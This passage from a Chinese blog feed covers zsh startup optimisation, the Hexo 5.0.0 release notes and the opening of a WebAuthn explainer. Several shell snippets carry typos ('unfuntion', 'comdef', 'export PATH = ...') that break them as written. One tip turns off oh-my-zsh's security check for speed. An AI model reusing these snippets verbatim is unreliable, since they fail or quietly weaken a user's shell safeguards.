的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 